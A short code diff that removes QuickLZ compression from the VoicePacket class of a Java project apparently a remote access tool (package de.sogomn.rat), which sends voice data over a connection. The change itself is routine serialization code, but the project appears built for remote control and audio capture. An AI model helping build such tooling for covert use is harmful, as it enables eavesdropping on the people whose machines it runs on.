@@ -2,7 +2,6 @@ package de.sogomn.rat.packet;
 
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
-import de.sogomn.rat.util.QuickLZ;
 
 public final class VoicePacket extends AbstractPingPongPacket {
 	
@@ -27,10 +26,8 @@ public final class VoicePacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveConnection connection) {
-		final byte[] compressed = QuickLZ.compress(data);
-		
-		connection.writeInt(compressed.length);
-		connection.write(compressed);
+		connection.writeInt(data.length);
+		connection.write(data);
 	}
 	
 	@Override
@@ -44,7 +41,6 @@ public final class VoicePacket extends AbstractPingPongPacket {
 		
 		data = new byte[length];
 		connection.read(data);
-		data = QuickLZ.decompress(data);
 	}
 	
 	@Override
